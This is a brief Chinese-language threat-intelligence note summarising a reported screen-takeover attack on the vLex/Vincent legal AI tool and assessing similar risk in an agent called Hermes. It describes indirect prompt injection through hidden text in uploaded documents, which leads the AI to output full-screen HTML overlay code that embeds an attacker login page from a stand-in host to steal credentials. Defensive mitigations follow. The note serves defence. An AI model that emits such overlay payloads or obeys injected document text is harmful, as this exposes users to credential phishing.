# vLex Screen Takeover Attack — PromptArmor Threat Intelligence

**来源**: PromptArmor, 2026
**URL**: https://www.promptarmor.com/resources/screen-takeover-attack-in-ai-tool-acquired-for-1b
**相关性**: HIGH — Hermes computer_use 接口存在相同攻击面

## 概述

vLex/Vincent AI（法律 AI 工具，$10B 收购）发现屏幕接管漏洞。通过间接提示注入实现在 AI 界面上覆盖伪造的登录弹窗。

## 三步攻击链

1. **文档投毒**：用户上传不受信文档（如从网上下载的案例分析报告），文档包含白底白字的隐藏提示注入。注入内容包含伪造的证人引述，实际为 HTML overlay 代码。
2. **AI 读取注入**：用户问 AI "帮我解析直接引语"，AI 读取文档后复现了攻击者的"引语"——包含 HTML 屏幕覆盖代码。
3. **屏幕接管**：HTML 代码创建 `position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 2147483647` 的全屏覆盖层，通过 `<object data="https://attacker/login" type="text/html">` 嵌入攻击者登录页面。

## 攻击向量

- **入口**：文档上传（隐藏文本注入）
- **触发**：用户合法请求（"解析引语"）
- **执行**：AI 输出中被注入的 HTML 代码通过 z-index 堆叠实现全屏覆盖
- **效果**：伪造登录弹窗窃取凭证

## 与 Hermes 的关联

| 攻击面 | Hermes 状态 | 风险 |
|--------|------------|------|
| computer_use 可执行任意屏幕操作 | Hermes 有 `computer_use` 工具 | HIGH |
| 用户可能上传含注入的文档/代码 | Hermes 支持文件读取和执行 | MED |
| 注入内容通过工具输出传递 | Hermes 的 skills/tools 输出给用户 | MED |

## 防护建议

- 对 computer_use 输出进行 HTML/JS 清洗
- 对涉及文件的 tool 调用保持警惕（白名单校验）
- 文档解析前提示用户风险
- 对高权限操作（屏幕点击、文件写入）要求显式确认
